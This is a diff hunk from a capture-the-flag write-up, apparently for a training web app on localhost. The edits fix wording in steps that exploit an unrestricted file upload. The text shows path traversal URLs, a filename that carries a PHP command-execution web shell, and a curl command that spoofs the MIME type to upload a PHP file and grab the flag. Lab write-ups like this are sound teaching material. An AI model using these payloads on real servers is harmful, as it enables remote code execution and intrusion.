@@ -9,11 +9,11 @@ By tring to upload several files, we can see that we can seemingly only send `.j
 - `test.php` → `Your image was not uploaded.`
 
 Path traversal doesn't work here: http://localhost:8080/?page=../../../../../../../tmp and
-http://localhost:8080/?page=../../../../../../../tmp/test.jpeg only say `You can DO it !!!  :]`.
+http://localhost:8080/?page=../../../../../../../tmp/test.jpeg only says `You can DO it !!!  :]`.
 
 We tried to execute code during the filename validation with a file called `'<?php system($_GET[cmd]); ?>.jpeg'`, however it only results in `/tmp/.jpeg succesfully uploaded.`.
 
-With `curl`, by copying the request sent from a browser and hardcoding the MIME type to `image/jpeg`, we get the flag:
+With `curl`, by copying the request sent from a browser and hardcoding the MIME type to `image/jpeg` while sending a PHP file, we get the flag:
 
 ```console
 $ curl -X POST 'http://localhost:8080/index.php?page=upload#' -H 'Content-Type: multipart/form-data' -F 'uploaded=@unrestricted_file_upload/resources/test.php;type=image/jpeg' -F 'MAX_FILE_SIZE=100000' -F 'Upload=Upload' | grep flag
